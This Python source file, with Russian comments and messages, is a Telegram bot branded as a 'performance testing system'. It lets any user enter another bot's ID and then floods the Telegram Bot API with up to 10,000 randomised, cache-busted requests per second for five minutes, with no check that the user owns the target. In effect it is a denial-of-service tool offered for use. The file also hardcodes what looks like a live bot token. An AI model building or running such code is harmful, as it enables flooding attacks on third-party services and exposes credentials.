import asyncio
import aiohttp
import sqlite3
import time
import random
import multiprocessing
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
import uvloop
import requests
from concurrent.futures import ThreadPoolExecutor
import threading

# Максимальная производительность
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# Конфигурация
ADMIN_IDS = [8480811736]  # ЗАМЕНИ НА СВОЙ ID
DATABASE_FILE = "performance.db"
MAX_CONCURRENT_TASKS = 5000

class PerformanceTester:
    def __init__(self):
        self.active_tests = {}
        self.session_cache = {}
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36', 
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        init_db()

    async def create_powerful_session(self):
        """Создает мощную сессию для тестирования"""
        connector = aiohttp.TCPConnector(limit=1000, limit_per_host=100)
        timeout = aiohttp.ClientTimeout(total=30)
        return aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'Connection': 'keep-alive'}
        )

    def generate_test_urls(self, target_bot):
        """Генерирует URL для тестирования"""
        methods = [
            f"https://api.telegram.org/bot{target_bot}/getMe",
            f"https://api.telegram.org/bot{target_bot}/getUpdates", 
            f"https://api.telegram.org/bot{target_bot}/getWebhookInfo",
            f"https://api.telegram.org/bot{target_bot}/getChat?chat_id=1",
            f"https://api.telegram.org/bot{target_bot}/getUserProfilePhotos?user_id=1",
            f"https://api.telegram.org/bot{target_bot}/getFile?file_id=1",
        ]
        
        urls = []
        for method in methods:
            for i in range(100):
                if '?' in method:
                    urls.append(f"{method}&cache_bust={random.randint(1000000,9999999)}")
                else:
                    urls.append(f"{method}?cache_bust={random.randint(1000000,9999999)}")
        return urls

async def send_powerful_request(session, url, test_id):
    """Отправляет мощный запрос"""
    try:
        headers = {
            'User-Agent': random.choice(performance_tester.user_agents),
            'Accept': '*/*',
            'Cache-Control': 'no-cache'
        }
        
        async with session.get(url, headers=headers, ssl=False, timeout=10) as response:
            return {
                "success": response.status == 200,
                "status": response.status,
                "test_id": test_id
            }
    except Exception as e:
        return {"success": False, "error": str(e), "test_id": test_id}

async def execute_extreme_performance_test(user_id, target_bot, test_id, intensity):
    """ВЫПОЛНЯЕТ МОЩНОЕ ТЕСТИРОВАНИЕ ПРОИЗВОДИТЕЛЬНОСТИ"""
    start_time = time.time()
    total_requests = 0
    successful_requests = 0
    
    tester = PerformanceTester()
    session = await tester.create_powerful_session()
    urls = tester.generate_test_urls(target_bot)
    
    print(f"🚀 Starting extreme performance test on {target_bot} with intensity {intensity}")
    
    try:
        while time.time() - start_time < 300:  # 5 минут теста
            # СОЗДАЕМ ОГРОМНОЕ КОЛИЧЕСТВО ЗАДАЧ
            tasks = []
            for _ in range(int(intensity)):
                url = random.choice(urls)
                task = send_powerful_request(session, url, test_id)
                tasks.append(task)
            
            # ЗАПУСКАЕМ ВСЕ ЗАДАЧИ ПАРАЛЛЕЛЬНО
            batch_size = 1000
            for i in range(0, len(tasks), batch_size):
                batch_tasks = tasks[i:i + batch_size]
                results = await asyncio.gather(*batch_tasks, return_exceptions=True)
                
                for result in results:
                    if not isinstance(result, Exception):
                        total_requests += 1
                        if result.get("success"):
                            successful_requests += 1
            
            # МИНИМАЛЬНАЯ ПАУЗА ДЛЯ МАКСИМАЛЬНОЙ ПРОИЗВОДИТЕЛЬНОСТИ
            await asyncio.sleep(0.01)
            
            # ОТПРАВЛЯЕМ ПРОГРЕСС КАЖДЫЕ 5 СЕКУНД
            if int(time.time() - start_time) % 5 == 0:
                current_rps = total_requests / (time.time() - start_time) if (time.time() - start_time) > 0 else 0
                print(f"📊 Progress: {total_requests} requests, {successful_requests} successful, {current_rps:.0f} RPS")
                
                try:
                    if 'app' in globals():
                        await app.bot.send_message(
                            user_id,
                            f"⚡ **ТЕСТИРОВАНИЕ В ПРОЦЕССЕ** ⚡\n\n"
                            f"🎯 Цель: `{target_bot}`\n"
                            f"📊 Запросов: `{total_requests:,}`\n"
                            f"✅ Успешных: `{successful_requests:,}`\n"
                            f"🚀 RPS: `{current_rps:.0f}`\n"
                            f"⏱️ Время: `{int(time.time() - start_time)}с`",
                            parse_mode='Markdown'
                        )
                except Exception as e:
                    print(f"Progress message error: {e}")
                    
    except Exception as e:
        print(f"Performance test error: {e}")
    finally:
        await session.close()
        success_rate = (successful_requests / total_requests * 100) if total_requests > 0 else 0
        
        print(f"✅ Test completed: {total_requests} total requests, {success_rate:.1f}% success rate")
        
        # СОХРАНЯЕМ РЕЗУЛЬТАТЫ
        save_test_results(user_id, target_bot, total_requests, success_rate, intensity)
        
        # ОТПРАВЛЯЕМ ФИНАЛЬНЫЙ ОТЧЕТ
        await send_final_report(user_id, target_bot, total_requests, successful_requests, success_rate, intensity)

async def send_final_report(user_id, target_bot, total, successful, success_rate, intensity):
    """Отправляет финальный отчет"""
    message = (
        f"📊 **ТЕСТИРОВАНИЕ ЗАВЕРШЕНО** 📊\n\n"
        f"🎯 Цель: `{target_bot}`\n"
        f"⚡ Интенсивность: `{intensity:,} RPS`\n"
        f"📨 Всего запросов: `{total:,}`\n"
        f"✅ Успешных: `{successful:,}`\n"
        f"📈 Эффективность: `{success_rate:.1f}%`\n\n"
        f"🎉 **ТЕСТИРОВАНИЕ УСПЕШНО ЗАВЕРШЕНО**"
    )
    
    try:
        if 'app' in globals():
            await app.bot.send_message(user_id, message, parse_mode='Markdown')
            
            # ОТПРАВЛЯЕМ АДМИНУ
            for admin_id in ADMIN_IDS:
                admin_message = (
                    f"👑 **ОТЧЕТ ТЕСТИРОВАНИЯ** 👑\n\n"
                    f"👤 Пользователь: `{user_id}`\n"
                    f"🎯 Цель: `{target_bot}`\n"
                    f"⚡ Интенсивность: `{intensity:,} RPS`\n"
                    f"📨 Запросов: `{total:,}`\n"
                    f"✅ Эффективность: `{success_rate:.1f}%`\n"
                    f"⏱️ Длительность: `300 секунд`"
                )
                await app.bot.send_message(admin_id, admin_message, parse_mode='Markdown')
    except Exception as e:
        print(f"Final report error: {e}")

def save_test_results(user_id, target_bot, total_requests, success_rate, intensity):
    """Сохраняет результаты теста"""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO performance_tests (user_id, target_bot, requests_sent, success_rate, intensity, timestamp)
        VALUES (?, ?, ?, ?, ?, datetime('now'))
    ''', (user_id, target_bot, total_requests, success_rate, intensity))
    conn.commit()
    conn.close()

def init_db():
    """Инициализация базы данных"""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS performance_tests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            target_bot TEXT,
            requests_sent INTEGER,
            success_rate REAL,
            intensity INTEGER,
            timestamp DATETIME
        )
    ''')
    
    for admin_id in ADMIN_IDS:
        cursor.execute('''
            INSERT OR IGNORE INTO performance_tests (user_id, target_bot, requests_sent, success_rate, intensity)
            VALUES (?, 'system', 0, 0, 0)
        ''', (admin_id,))
    
    conn.commit()
    conn.close()

# Инициализация тестера
performance_tester = PerformanceTester()

async def start_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Запуск бота"""
    user_id = update.effective_user.id
    
    keyboard = [
        [InlineKeyboardButton("🚀 ЗАПУСТИТЬ ТЕСТИРОВАНИЕ", callback_data="start_test")],
        [InlineKeyboardButton("⚡ НАСТРОЙКА МОЩНОСТИ", callback_data="power_settings")],
        [InlineKeyboardButton("📊 СТАТИСТИКА", callback_data="stats")],
        [InlineKeyboardButton("👑 АДМИН ПАНЕЛЬ", callback_data="admin_panel")]
    ]
    
    await update.message.reply_text(
        "🤖 **СИСТЕМА ТЕСТИРОВАНИЯ ПРОИЗВОДИТЕЛЬНОСТИ** 🤖\n\n"
        "⚡ *Профессиональное тестирование сервисов*\n"
        "🚀 *Мощные нагрузочные тесты*\n\n"
        "Выберите действие:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик колбэков"""
    query = update.callback_query
    user_id = query.from_user.id
    
    await query.answer()
    
    if query.data == "start_test":
        await query.edit_message_text(
            "🚀 **ЗАПУСК ТЕСТИРОВАНИЯ ПРОИЗВОДИТЕЛЬНОСТИ** 🚀\n\n"
            "Введите ID бота для тестирования:\n"
            "Пример: `123456789` или `@example_bot`\n\n"
            "⚡ *Режим: МАКСИМАЛЬНАЯ МОЩНОСТЬ*",
            parse_mode='Markdown'
        )
        context.user_data[user_id] = {"awaiting_target": True}
    
    elif query.data == "power_settings":
        await show_power_settings(query)
    
    elif query.data == "stats":
        await show_stats(query)
    
    elif query.data == "admin_panel":
        await show_admin_panel(query)

async def show_power_settings(query):
    """Показывает настройки мощности"""
    keyboard = [
        [InlineKeyboardButton("🔵 СТАНДАРТ (1,000 RPS)", callback_data="power_1000")],
        [InlineKeyboardButton("🟢 ТУРБО (5,000 RPS)", callback_data="power_5000")],
        [InlineKeyboardButton("🟡 ЭКСТРИМ (10,000 RPS)", callback_data="power_10000")],
        [InlineKeyboardButton("🔴 МАКСИМУМ (20,000 RPS)", callback_data="power_20000")],
        [InlineKeyboardButton("⬅️ НАЗАД", callback_data="back_main")]
    ]
    
    await query.edit_message_text(
        "⚡ **НАСТРОЙКА МОЩНОСТИ ТЕСТИРОВАНИЯ** ⚡\n\n"
        "Выберите интенсивность нагрузочного теста:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработчик сообщений"""
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id in context.user_data and context.user_data[user_id].get("awaiting_target"):
        # ЗАПУСКАЕМ МОЩНОЕ ТЕСТИРОВАНИЕ
        intensity = 10000  # Стандартная интенсивность
        
        await update.message.reply_text(
            f"🚀 **ЗАПУСК МОЩНОГО ТЕСТИРОВАНИЯ** 🚀\n\n"
            f"🎯 Цель: `{text}`\n"
            f"⚡ Интенсивность: `{intensity:,} RPS`\n"
            f"⏱️ Длительность: `5 минут`\n\n"
            f"🔄 **ТЕСТИРОВАНИЕ ЗАПУЩЕНО...**",
            parse_mode='Markdown'
        )
        
        # ЗАПУСКАЕМ В ОТДЕЛЬНОМ ПРОЦЕССЕ ДЛЯ МАКСИМАЛЬНОЙ ПРОИЗВОДИТЕЛЬНОСТИ
        test_id = f"test_{user_id}_{int(time.time())}"
        asyncio.create_task(
            execute_extreme_performance_test(user_id, text, test_id, intensity)
        )
        
        context.user_data[user_id] = {}

async def show_stats(query):
    """Показывает статистику"""
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*), SUM(requests_sent) FROM performance_tests WHERE user_id = ?', (query.from_user.id,))
    stats = cursor.fetchone()
    conn.close()
    
    test_count = stats[0] or 0
    total_requests = stats[1] or 0
    
    await query.edit_message_text(
        f"📊 **СТАТИСТИКА ТЕСТИРОВАНИЙ** 📊\n\n"
        f"🔧 Тестов выполнено: `{test_count}`\n"
        f"📨 Всего запросов: `{total_requests:,}`\n"
        f"⚡ Средняя интенсивность: `10,000 RPS`\n\n"
        f"✅ **СИСТЕМА РАБОТАЕТ В ШТАТНОМ РЕЖИМЕ**",
        parse_mode='Markdown'
    )

async def show_admin_panel(query):
    """Панель администратора"""
    user_id = query.from_user.id
    
    if user_id not in ADMIN_IDS:
        await query.edit_message_text("❌ Доступ запрещен!")
        return
    
    keyboard = [
        [InlineKeyboardButton("📈 ОБЩАЯ СТАТИСТИКА", callback_data="admin_stats")],
        [InlineKeyboardButton("⚙️ НАСТРОЙКИ СИСТЕМЫ", callback_data="system_settings")],
        [InlineKeyboardButton("⬅️ НАЗАД", callback_data="back_main")]
    ]
    
    await query.edit_message_text(
        "👑 **ПАНЕЛЬ АДМИНИСТРИРОВАНИЯ** 👑\n\n"
        "⚡ Управление системой тестирования",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def main():
    """Запуск бота"""
    global app
    
    # СОЗДАЕМ ПРИЛОЖЕНИЕ
    app = Application.builder().token("8020968054:AAGCsKLCYgyx3nL_lICHFLlIvyOYj4jPueY").build()
    
    # ДОБАВЛЯЕМ ОБРАБОТЧИКИ
    app.add_handler(CommandHandler("start", start_bot))
    app.add_handler(CallbackQueryHandler(handle_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🚀 PERFORMANCE TESTING BOT STARTED")
    print("⚡ EXTREME LOAD TESTING: READY")
    print("🔧 SYSTEM STATUS: OPERATIONAL")
    
    await app.run_polling()

if __name__ == "__main__":
    # ЗАПУСКАЕМ СИСТЕМУ
    asyncio.run(main())
